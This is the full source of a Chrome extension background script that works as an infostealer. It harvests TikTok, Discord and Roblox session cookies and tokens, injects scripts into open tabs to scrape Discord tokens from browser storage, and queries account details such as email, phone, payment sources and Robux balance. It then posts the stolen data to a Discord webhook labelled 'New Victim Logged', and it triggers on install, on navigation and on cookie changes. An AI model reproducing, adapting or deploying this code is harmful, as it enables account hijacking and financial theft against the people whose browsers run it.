const DISCORD_WEBHOOK = "WEBHOOK_PLACEHOLDER_12345";

let lastKnownCookies = {
  tiktok: new Set(),
  discord: new Set(),
  roblox: new Set()
};

// Load previous cookies from storage
chrome.storage.local.get(['knownCookies'], (result) => {
  if (result.knownCookies) {
    lastKnownCookies = result.knownCookies;
  }
});

// Monitor cookie changes in real-time
chrome.cookies.onChanged.addListener((changeInfo) => {
  const cookie = changeInfo.cookie;
  
  if (cookie.domain.includes('tiktok.com') && 
      (cookie.name === 'sessionid' || cookie.name === 'sid_tt')) {
    if (!changeInfo.removed && !lastKnownCookies.tiktok.has(cookie.value)) {
      console.log('🎵 New TikTok cookie detected!');
      setTimeout(() => stealEverything(), 2000);
    }
  }
  
  if (cookie.domain.includes('discord.com') && cookie.name === 'token') {
    if (!changeInfo.removed && !lastKnownCookies.discord.has(cookie.value)) {
      console.log('💬 New Discord cookie detected!');
      setTimeout(() => stealEverything(), 2000);
    }
  }
  
  if (cookie.domain.includes('roblox.com') && cookie.name === '.ROBLOSECURITY') {
    if (!changeInfo.removed && !lastKnownCookies.roblox.has(cookie.value)) {
      console.log('🎮 New Roblox cookie detected!');
      setTimeout(() => stealEverything(), 2000);
    }
  }
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'checkLogin') {
    stealEverything().then(sendResponse);
    return true;
  }
});

chrome.runtime.onInstalled.addListener(() => {
  setTimeout(stealEverything, 3000);
});

chrome.webNavigation.onCompleted.addListener(
  (details) => {
    if (details.frameId === 0) {
      setTimeout(stealEverything, 5000);
    }
  },
  { url: [
    { hostSuffix: 'tiktok.com' },
    { hostSuffix: 'discord.com' },
    { hostSuffix: 'roblox.com' }
  ]}
);

async function stealEverything() {
  const stolen = {
    tiktok: null,
    discord: null,
    roblox: null,
    timestamp: new Date().toISOString()
  };
  
  try {
    const tiktokData = await stealTikTok();
    if (tiktokData) {
      stolen.tiktok = tiktokData;
      lastKnownCookies.tiktok.add(tiktokData.cookie);
    }
  } catch (e) {
    console.log('TikTok steal failed:', e);
  }
  
  try {
    const discordData = await stealDiscord();
    if (discordData) {
      stolen.discord = discordData;
      discordData.forEach(acc => lastKnownCookies.discord.add(acc.token));
    }
  } catch (e) {
    console.log('Discord steal failed:', e);
  }
  
  try {
    const robloxData = await stealRoblox();
    if (robloxData) {
      stolen.roblox = robloxData;
      lastKnownCookies.roblox.add(robloxData.cookie);
    }
  } catch (e) {
    console.log('Roblox steal failed:', e);
  }
  
  chrome.storage.local.set({ knownCookies: lastKnownCookies });
  
  if (stolen.tiktok || stolen.discord || stolen.roblox) {
    await sendToWebhook(stolen);
  }
  
  return stolen.tiktok;
}

async function stealTikTok() {
  const cookies = await chrome.cookies.getAll({ domain: '.tiktok.com' });
  const sessionCookie = cookies.find(c => c.name === 'sessionid' || c.name === 'sid_tt');
  
  if (!sessionCookie) return null;
  
  let userData = {
    username: 'Unknown',
    followers: 0,
    userId: 'N/A',
    avatar: null,
    cookie: sessionCookie.value
  };
  
  // Try multiple API endpoints
  try {
    // Method 1: Try new API
    const response1 = await fetch('https://www.tiktok.com/api/user/detail/?WebIdLastTime=1234567890', {
      credentials: 'include'
    });
    
    if (response1.ok) {
      const data = await response1.json();
      if (data.userInfo) {
        userData.username = data.userInfo.user.uniqueId;
        userData.followers = data.userInfo.stats.followerCount;
        userData.userId = data.userInfo.user.id;
        userData.avatar = data.userInfo.user.avatarLarger || data.userInfo.user.avatarMedium;
      }
    }
  } catch (e) {
    console.log('TikTok API 1 failed:', e);
  }
  
  // Method 2: Inject script to get data from page
  if (userData.username === 'Unknown') {
    try {
      const tabs = await chrome.tabs.query({ url: '*://*.tiktok.com/*' });
      
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                // Check for user data in window object
                if (window.__UNIVERSAL_DATA_FOR_REHYDRATION__) {
                  const data = window.__UNIVERSAL_DATA_FOR_REHYDRATION__;
                  if (data.__DEFAULT_SCOPE__?.['webapp.user-detail']?.userInfo) {
                    const user = data.__DEFAULT_SCOPE__['webapp.user-detail'].userInfo.user;
                    const stats = data.__DEFAULT_SCOPE__['webapp.user-detail'].userInfo.stats;
                    return {
                      username: user.uniqueId,
                      followers: stats.followerCount,
                      userId: user.id,
                      avatar: user.avatarLarger || user.avatarMedium
                    };
                  }
                }
                
                // Check meta tags
                const metaAvatar = document.querySelector('meta[property="og:image"]');
                if (metaAvatar) {
                  return { avatar: metaAvatar.content };
                }
              } catch (e) {
                return null;
              }
            }
          });
          
          if (results && results[0] && results[0].result) {
            const pageData = results[0].result;
            if (pageData.username) userData.username = pageData.username;
            if (pageData.followers) userData.followers = pageData.followers;
            if (pageData.userId) userData.userId = pageData.userId;
            if (pageData.avatar) userData.avatar = pageData.avatar;
          }
        } catch (e) {
          console.log('TikTok script injection failed:', e);
        }
      }
    } catch (e) {
      console.log('TikTok tab query failed:', e);
    }
  }
  
  return userData;
}

async function stealDiscord() {
  const tokens = new Set();
  
  try {
    const discordCookies = await chrome.cookies.getAll({ domain: '.discord.com' });
    discordCookies.forEach(cookie => {
      if (cookie.name === 'token' || cookie.value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/)) {
        tokens.add(cookie.value);
      }
    });
  } catch (e) {
    console.log('Cookie check failed:', e);
  }
  
  try {
    const tabs = await chrome.tabs.query({ url: '*://*.discord.com/*' });
    
    for (const tab of tabs) {
      try {
        const results = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: () => {
            const foundTokens = [];
            
            try {
              for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                if (value) {
                  const cleanValue = value.replace(/"/g, '');
                  const tokenMatch = cleanValue.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
                  if (tokenMatch) {
                    tokenMatch.forEach(t => foundTokens.push(t));
                  }
                }
              }
            } catch (e) {}
            
            try {
              for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                if (value) {
                  const cleanValue = value.replace(/"/g, '');
                  const tokenMatch = cleanValue.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
                  if (tokenMatch) {
                    tokenMatch.forEach(t => foundTokens.push(t));
                  }
                }
              }
            } catch (e) {}
            
            try {
              if (window.webpackChunkdiscord_app) {
                window.webpackChunkdiscord_app.push([
                  [Math.random()],
                  {},
                  (req) => {
                    for (const m of Object.keys(req.c)
                      .map((x) => req.c[x].exports)
                      .filter((x) => x)) {
                      if (m.default && m.default.getToken !== undefined) {
                        const token = m.default.getToken();
                        if (token) foundTokens.push(token);
                      }
                      if (m.getToken !== undefined) {
                        const token = m.getToken();
                        if (token) foundTokens.push(token);
                      }
                    }
                  }
                ]);
              }
            } catch (e) {}
            
            return foundTokens;
          }
        });
        
        if (results && results[0] && results[0].result) {
          results[0].result.forEach(token => tokens.add(token));
        }
      } catch (e) {
        console.log('Script injection failed:', e);
      }
    }
  } catch (e) {
    console.log('Tab query failed:', e);
  }
  
  if (tokens.size === 0) {
    return null;
  }
  
  const validAccounts = [];
  
  for (const token of tokens) {
    try {
      const response = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 
          'Authorization': token,
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const userData = await response.json();
        
        // Build avatar URL
        const avatarHash = userData.avatar;
        const userId = userData.id;
        const avatarUrl = avatarHash 
          ? `https://cdn.discordapp.com/avatars/${userId}/${avatarHash}.${avatarHash.startsWith('a_') ? 'gif' : 'png'}?size=256`
          : `https://cdn.discordapp.com/embed/avatars/${parseInt(userData.discriminator) % 5}.png`;
        
        let billing = null;
        try {
          const billingResponse = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
            headers: { 
              'Authorization': token,
              'Content-Type': 'application/json'
            }
          });
          if (billingResponse.ok) {
            billing = await billingResponse.json();
          }
        } catch (e) {}
        
        validAccounts.push({
          token: token,
          username: userData.username,
          discriminator: userData.discriminator,
          id: userData.id,
          email: userData.email || 'N/A',
          phone: userData.phone || 'N/A',
          verified: userData.verified || false,
          mfa_enabled: userData.mfa_enabled || false,
          premium_type: userData.premium_type || 0,
          nitro: userData.premium_type ? (userData.premium_type === 1 ? 'Nitro Classic' : 'Nitro') : 'None',
          billing: billing ? billing.length > 0 : false,
          avatar: avatarUrl
        });
      }
    } catch (e) {
      console.log('Token validation failed:', e);
    }
  }
  
  return validAccounts.length > 0 ? validAccounts : null;
}

async function stealRoblox() {
  const cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
  const roblosecurityCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
  
  if (!roblosecurityCookie) return null;
  
  let userData = {
    username: 'Unknown',
    userId: 0,
    robux: 0,
    premium: false,
    cookie: roblosecurityCookie.value,
    rap: 0,
    avatar: null
  };
  
  try {
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      credentials: 'include'
    });
    
    if (userResponse.ok) {
      const userInfo = await userResponse.json();
      userData.username = userInfo.name;
      userData.userId = userInfo.id;
      userData.displayName = userInfo.displayName;
      
      // Get avatar
      try {
        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userInfo.id}&size=420x420&format=Png`);
        const avatarData = await avatarResponse.json();
        if (avatarData.data && avatarData.data[0]) {
          userData.avatar = avatarData.data[0].imageUrl;
        }
      } catch (e) {
        console.log('Avatar fetch error');
      }
      
      try {
        const robuxResponse = await fetch(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`, {
          credentials: 'include'
        });
        const robuxData = await robuxResponse.json();
        userData.robux = robuxData.robux || 0;
      } catch (e) {}
      
      try {
        const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userInfo.id}/validate-membership`, {
          credentials: 'include'
        });
        userData.premium = await premiumResponse.json();
      } catch (e) {}
      
      try {
        const inventoryResponse = await fetch(`https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?limit=100`, {
          credentials: 'include'
        });
        const inventoryData = await inventoryResponse.json();
        
        if (inventoryData.data) {
          userData.rap = inventoryData.data.reduce((sum, item) => 
            sum + (item.recentAveragePrice || 0), 0
          );
        }
      } catch (e) {}
    }
  } catch (e) {
    console.log('Roblox user fetch error:', e);
  }
  
  return userData;
}

async function sendToWebhook(stolen) {
  const embeds = [];
  
  if (stolen.tiktok) {
    embeds.push({
      title: '🎵 TikTok Account',
      color: 0x00f2ea,
      thumbnail: stolen.tiktok.avatar ? { url: stolen.tiktok.avatar } : undefined,
      fields: [
        { name: '👤 Username', value: '@' + stolen.tiktok.username, inline: true },
        { name: '📊 Followers', value: stolen.tiktok.followers.toLocaleString(), inline: true },
        { name: '🆔 User ID', value: stolen.tiktok.userId.toString(), inline: true }
      ],
      timestamp: stolen.timestamp
    });
    
    embeds.push({
      title: '🍪 TikTok Cookie',
      color: 0x00f2ea,
      description: '```' + stolen.tiktok.cookie + '```'
    });
  }
  
  if (stolen.discord) {
    stolen.discord.forEach((account, index) => {
      embeds.push({
        title: `💬 Discord Account ${index + 1}`,
        color: 0x5865F2,
        thumbnail: { url: account.avatar },
        fields: [
          { name: '👤 Username', value: account.username + '#' + account.discriminator, inline: true },
          { name: '🆔 User ID', value: account.id, inline: true },
          { name: '📧 Email', value: account.email, inline: true },
          { name: '📱 Phone', value: account.phone, inline: true },
          { name: '✅ Verified', value: account.verified ? 'Yes' : 'No', inline: true },
          { name: '🔐 2FA', value: account.mfa_enabled ? 'Enabled' : 'Disabled', inline: true },
          { name: '💎 Nitro', value: account.nitro, inline: true },
          { name: '💳 Billing', value: account.billing ? 'Has Payment' : 'No Payment', inline: true }
        ],
        timestamp: stolen.timestamp
      });
      
      embeds.push({
        title: `🎫 Discord Token ${index + 1}`,
        color: 0x5865F2,
        description: '```' + account.token + '```'
      });
    });
  }
  
  if (stolen.roblox) {
    embeds.push({
      title: '🎮 Roblox Account',
      color: 0xe74c3c,
      thumbnail: stolen.roblox.avatar ? { url: stolen.roblox.avatar } : undefined,
      fields: [
        { name: '👤 Username', value: stolen.roblox.username, inline: true },
        { name: '🆔 User ID', value: stolen.roblox.userId.toString(), inline: true },
        { name: '💰 Robux', value: stolen.roblox.robux.toLocaleString(), inline: true },
        { name: '📊 RAP', value: stolen.roblox.rap.toLocaleString(), inline: true },
        { name: '⭐ Premium', value: stolen.roblox.premium ? 'Yes' : 'No', inline: true }
      ],
      timestamp: stolen.timestamp
    });
    
    embeds.push({
      title: '🍪 Roblox Cookie',
      color: 0xe74c3c,
      description: '```' + stolen.roblox.cookie + '```'
    });
  }
  
  try {
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '🎯 **New Victim Logged** | ' + new Date().toLocaleString(),
        embeds: embeds
      })
    });
  } catch (error) {
    console.error('Webhook failed:', error);
  }
}